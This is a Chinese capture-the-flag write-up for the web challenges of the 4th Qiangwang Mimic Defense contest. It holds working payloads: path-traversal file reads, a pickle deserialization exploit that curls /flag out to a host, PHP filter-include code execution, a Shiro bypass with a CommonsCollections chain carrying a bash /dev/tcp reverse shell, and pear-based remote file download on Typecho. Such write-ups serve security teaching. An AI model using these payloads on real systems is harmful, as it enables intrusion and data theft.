# 第四届“强网”拟态防御国际精英挑战赛web的wp

阅读量 **525361**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-04 14:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01e8c0152bc2633a06.jpg)

## web

### **zerocalc**

![](https://p2.ssl.qhimg.com/t01d6192b72777c4270.png)

readFile函数可以任意文件读取！

`readFile('./src/index.js')`读出源码后：

notevil是最新的版本！正当我头脑风暴的时候！

`readFile('../../../../../../flag')` 可以直接读出`flag`

![](https://p3.ssl.qhimg.com/t01c53b55b0e65cb1da.png)

### **new_hospital**

这题打开是一个正常的网站！

![](https://p2.ssl.qhimg.com/t0119d3c6ca95c0f113.png)

测试了网站功能时发现`feature.php` 好像存在任意文件读取！

API的值是文件名base64加密后的值！

![](https://p3.ssl.qhimg.com/t01148a63466db3179e.png)

id控制读取的文件名。但是限制了文件后缀只能是js文件！

![](https://p5.ssl.qhimg.com/t014bee5ba2039b9ead.png)

扫描网站目录！

![](https://p2.ssl.qhimg.com/t01794255cb6758e3b1.png)

发现old目录！因为旧网站地址！

测试发现old下的`feature.php` 可以通过API参数任意文件读取！

`/etc/passwd` base64加密后：`L2V0Yy9wYXNzd2Q=`

![](https://p0.ssl.qhimg.com/t01965b570cf7a9b7ce.png)

读flag

`/var/www/html/flag.php` base64加密：`L3Zhci93d3cvaHRtbC9mbGFnLnBocA==`

![](https://p2.ssl.qhimg.com/t01a8a2ebd29277fd73.png)

### **ezPickle**

分析源码：

发现有个后门！

    
    
    notadmin={"admin":"no"}
    
    def backdoor(cmd):
        if notadmin["admin"]=="yes":
            s=''.join(cmd)
            eval(s)
    

并且：反序列化的内容进行了一个过滤。限定了只能反序列化`config`类，而且调用的方法或属性中不能含有`__`

    
    
    class RestrictedUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            if module in ['config'] and "__" not in name:
                return getattr(sys.modules[module], name)
            raise pickle.UnpicklingError("'%s.%s' not allowed" % (module, name))
    

思路就是：为了利用这个后门，我们得把`config.notadmin`的值改为`{"admin":"yes"}`

利用工具生成恶意序列化字符串。

**exp.py**

    
    
    notadmin = GLOBAL('config', 'notadmin')
    notadmin['admin'] = 'yes'
    config_backdoor = GLOBAL('config', 'backdoor')
    config_backdoor(["__import__('os').popen('curl 0.0.0.0:1?i=`cat /flag|base64`').read()"])
    return
    

**payload:**

    
    
    b"cconfig\nnotadmin\np0\n0g0\nS'admin'\nS'yes'\nscconfig\nbackdoor\np2\n0g2\n((S'__import__(\\'os\\').popen(\\'curl 0.0.0.0:1?i=`cat /flag|base64`\\').read()'\nltR."
    

把base64加密后的payload传入name参数：

    
    
    Y2NvbmZpZwpub3RhZG1pbgpwMAowZzAKUydhZG1pbicKUyd5ZXMnCnNjY29uZmlnCmJhY2tkb29yCnAyCjBnMgooKFMnX19pbXBvcnRfXyhcJ29zXCcpLnBvcGVuKFwnY3VybCAwLjAuMC4wOjE/aT1gY2F0IC9mbGFnfGJhc2U2NGBcJykucmVhZCgpJwpsdFIu
    

获取flag:

![](https://p0.ssl.qhimg.com/t0124c5dcf8854067e7.png)

### **EasyFilter**

题目源码：

    
    
    <?php
        ini_set("open_basedir","./");
        if(!isset($_GET['action'])){
            highlight_file(__FILE__);
            die();
        }
        if($_GET['action'] == 'w'){
            @mkdir("./files/");
            $content = $_GET['c'];
            $file = bin2hex(random_bytes(5));
            file_put_contents("./files/".$file,base64_encode($content));
            echo "./files/".$file;
        }elseif($_GET['action'] == 'r'){
            $r = $_GET['r'];
            $file = "./files/".$r;
            include("php://filter/resource=$file");
        }
    

有个写文件 和包含文件的功能！

经过测试发现： 它好像缺少过滤器：

![](https://p3.ssl.qhimg.com/t0105d535f579e12fdf.png)

![](https://p0.ssl.qhimg.com/t010892fe240931fa14.png)

构造payload: 我们给他加一个过滤器

    
    
    ?action=w&c=<?=phpinfo();
    
    
    
    ?action=r&r=/convert.base64-decode/../5f72d0bd55
    

可以成功包含：

![](https://p3.ssl.qhimg.com/t015d5f3361f236fe88.png)

读取flag:

payload:

    
    
    ?action=w&c=<?=`cat /flag`;
    
    
    
    ?action=r&r=/convert.base64-decode/../2f5a44c406
    

![](https://p0.ssl.qhimg.com/t0152a1e7604ad97a85.png)

### **Jack-Shiro**

下载pom.xml后：

有shiro1.5.1，cc3.2.1

![](https://p2.ssl.qhimg.com/t01489347db3d0abc91.png)

思路就是：shiro验证绕过访问路由通过jackson反序列化打cc链

发现有json路由需要登陆通过`/;/json`绕过

直接上工具ysomap用cc8去打

payload:

    
    
    use exploit LDAPLocalChainListener
    set lport 8996
    use payload  CommonsCollections8
    use bullet TransformerBullet
    set version 3
    set args 'bash -i >& /dev/tcp/ip/8866 0>&1'
    run
    

![](https://p1.ssl.qhimg.com/t018e1f2e84f2e9fa72.png)

![](https://p4.ssl.qhimg.com/t015215edb17a1d99e8.png)

### **Give_me_your_0day**

看源码是Typecho

上网查质料就只要一个Typecho反序列化漏洞！

由于题目环境的原因：`config.inc.php` 文件是无法创建的！

代码审计：

看`install.php`

就发现一处包含点！

![](https://p2.ssl.qhimg.com/t01e603b1b7f1503c24.png)

我们可以通过控制config参数和adapter参数来控制 变量`$type`。 就可以任意文件包含（但是限制文件后缀是php）！

![](https://p3.ssl.qhimg.com/t012a9ec3860fde625a.png)

那现在思路很明确了！

就找一个可以利用的php文件就行了！

查阅质料发现：可以包含php环境自带的pearcmd文件

然后通过`pear install -R /tmp http://127.0.0.1:8080/1.php` 命令下载恶意文件到服务器，实现RCE！

###  测试

1 在服务器上使用python一句话开启http服务器:`python -m SimpleHTTPServer 8080`

2 通过`pear install -R /var/www/html http://0.0.0.0:8080/1.php`
命令下载恶意文件到服务器，实现RCE！

![](https://p4.ssl.qhimg.com/t01032716d3d2645b90.png)

3 读取FLAG

![](https://p0.ssl.qhimg.com/t0125d9015399c0762d.png)

## 总结：

和师傅们一起玩的很开心！有大师傅MoonBack带带，玩的很开心！😀😀😀

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **upload** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256992](/post/id/256992)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __10赞

 __收藏

![](https://p5.ssl.qhimg.com/t01cd139ed3449e70c7.png) upload

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

